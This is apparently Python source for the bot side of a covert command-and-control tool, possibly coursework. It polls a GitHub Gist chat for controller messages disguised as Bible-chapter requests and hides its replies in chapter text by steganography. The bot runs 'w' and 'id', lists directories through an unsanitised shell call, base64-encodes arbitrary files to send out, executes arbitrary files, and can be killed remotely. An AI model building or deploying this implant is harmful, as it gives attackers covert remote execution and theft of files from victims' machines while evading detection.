import base64
import uuid
import sys
from time import sleep
from subprocess import check_output
from os import path

sys.path.append('..')
from common.utils import add_message, check_chat_file, get_last_messages, read_attachment
from common.utils import CONTROLLER_NICK_NAME
from common.gist import pull_gist, init_gist
from common.chapters import get_command_for_chapter, read_chapter
from common.steganography import encode_to_text, decode_from_text


BOT_SLEEP_TIME = 5
BOT_NICK_NAME = sys.argv[1] if len(sys.argv) > 1 else 'BIBLE'


def process_who():
    try:
        return check_output('w', shell=True).decode('utf-8').strip()
    except Exception:
        return 'Command "w" not found (probably Windows PC)'


def process_ls(dir_path):
    if path.exists(dir_path):
        return check_output(f'ls {dir_path}', shell=True).decode('utf-8').strip()
    return 'Directory does not exist'


def process_id():
    return check_output('id', shell=True).decode('utf-8').strip()


def process_cp(file_path):
    if path.exists(file_path):
        file = open(file_path, 'rb')
        data_binary = file.read()
        return base64.b64encode(data_binary).decode('ascii')
    return ''


def process_exec(file_path):
    if path.exists(file_path):
        try:
            return check_output(file_path, shell=True).decode('utf-8').strip()
        except Exception:
            try:
                return check_output(f'sh {file_path}', shell=True).decode('utf-8').strip()
            except Exception:
                return 'File cannot be run'
    return 'File does not exist'


def send_reply(cmd, chapter_n, result, question_msg_id, reply_text):
    print(f'>>> {cmd} reply:\n{result}', flush=True)

    chapter = read_chapter(chapter_n)
    encoded, encoded_len = encode_to_text(result, chapter)
    attachment = {
        'name': str(uuid.uuid4()) + '.txt',
        'content': encoded[0:int(encoded_len*1.2)],
    }
    reply_to = {
        'msg_id': question_msg_id,
        'user': CONTROLLER_NICK_NAME,
    }
    add_message(reply_text, BOT_NICK_NAME, reply_to=reply_to, attachment=attachment)


def process_msg(sender, msg_id, msg, attachment):
    if len(msg) == 0 or sender != CONTROLLER_NICK_NAME:
        print('>>> Message is not a command', flush=True)
        return

    if msg == 'Tell me latest Bible news...':
        reply_to = {
            'msg_id': msg_id,
            'user': CONTROLLER_NICK_NAME,
        }
        add_message('Bible is old, there are no news', BOT_NICK_NAME, reply_to=reply_to)
        print('>>> Heartbeat, bot is running', flush=True)

    elif msg.startswith('Send me text of chapter '):
        chapter_n = int(msg[24]) if msg[25] == ',' else int(msg[24:26])
        cmd = get_command_for_chapter(chapter_n)

        if cmd == 'w':
            result = process_who()
        elif cmd == 'id':
            result = process_id()
        elif cmd == 'kill':
            return 'kill'
        else:
            print(f'>>> Invalid command: "{cmd}" without attachment', flush=True)
            return

        send_reply(cmd, chapter_n, result, msg_id, 'Text of the chapter is in the attachment')

    elif msg.startswith('Is this attachment part of chapter '):
        chapter_n = int(msg[35]) if msg[36] == '?' else int(msg[35:37])
        cmd = get_command_for_chapter(chapter_n)

        if attachment is None:
            print(f'>>> Invalid command: No attachment for "{cmd}"', flush=True)
            return

        text = read_attachment(attachment)
        decoded = decode_from_text(text)

        if cmd == 'ls':
            result = process_ls(decoded)
        elif cmd == 'cp':
            result = process_cp(decoded)
        elif cmd == 'exec':
            result = process_exec(decoded)
        else:
            print(f'>>> Invalid command: "{cmd}" with attachment', flush=True)
            return

        send_reply(cmd, chapter_n, result, msg_id, f'No, it is not, I send the chapter {chapter_n} in the attachment')

    else:
        print(f'>>> Unknown command: "{msg}"', flush=True)
        return


def run():
    print('>>> Bot is starting...', flush=True)
    init_gist()
    max_msg_id = check_chat_file(CONTROLLER_NICK_NAME)
    print(f'>>> Bot is running as {BOT_NICK_NAME}...', flush=True)

    is_killed = False

    while not is_killed:
        sleep(BOT_SLEEP_TIME)
        pull_gist()
        new_max_msg_id = check_chat_file(CONTROLLER_NICK_NAME)

        if new_max_msg_id < max_msg_id:
            print(f'>>> Gist was reset...', flush=True)
            max_msg_id = 1

        if new_max_msg_id > max_msg_id:
            count = new_max_msg_id - max_msg_id
            print(f'>>> Processing {count} new messages...', flush=True)

            messages = get_last_messages(CONTROLLER_NICK_NAME, count)
            for (sender, msg_id, reply_id, attachment, msg) in messages:
                result = process_msg(sender, msg_id, msg, attachment)
                if result == 'kill':
                    print('>>> Killing the bot...')
                    is_killed = True
                    break

            max_msg_id = new_max_msg_id


if __name__ == '__main__':
    run()
